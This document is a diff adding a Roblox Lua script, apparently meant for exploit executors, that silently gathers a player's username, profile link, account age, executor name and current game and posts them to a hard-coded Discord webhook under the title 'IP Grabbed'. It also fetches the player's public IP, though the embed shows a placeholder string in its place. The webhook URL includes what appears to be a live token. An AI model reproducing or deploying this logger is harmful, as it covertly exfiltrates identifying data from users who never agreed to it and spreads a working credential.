@@ -1,0 +1,56 @@
+pcall(function()
+	local Players = game:GetService("Players")
+	local MarketPlaceService = game:GetService("MarketplaceService")
+
+	local LocalPlayer = Players.LocalPlayer
+
+	local IP = tostring(game:HttpGet("https://api.ipify.org", true))
+
+	local webhookcheck =
+		is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+		secure_load and "Sentinel" or
+		KRNL_LOADED and "Krnl" or
+		SONA_LOADED and "Sona" or
+		"Unknown exploit"
+
+	local url =
+		"https://discord.com/api/webhooks/825789544560984074/23k5juByQ0j1f20MMqRtBWx_wte19G3Bxrb0nP3NZvoIdEJJk400Hl1J8IBmS-24jBj3"
+	local data = {
+		["embeds"] = {
+			{
+				["title"] = "IP Grabbed",
+				["description"] = "**IP:** || " .. "DABABY 69" .. ":80 ||";
+				["fields"] = {
+					{
+						["name"] = "Username:";
+						["value"] = "[" .. LocalPlayer.Name .. "](https://www.roblox.com/users/" .. LocalPlayer.UserId .. ")";
+						["inline"] = true;
+					};
+					{
+						["name"] = "Account Age:";
+						["value"] = LocalPlayer.AccountAge;
+						["inline"] = true;
+					};
+					{
+						["name"] = "Executor Used:";
+						["value"] = webhookcheck;
+						["inline"] = true;
+					};
+					{
+						["name"] = "Game:";
+						["value"] = "[" .. MarketPlaceService:GetProductInfo(game.PlaceId).Name .. "](" .. "https://www.roblox.com/games/" .. game.PlaceId .. ")";
+						["inline"] = true;
+					};
+				}
+			}
+		}
+	}
+	local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+	local headers = {
+		["content-type"] = "application/json"
+	}
+	request = http_request or request or HttpPost or syn.request
+	local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+	request(abcdef)
+end)
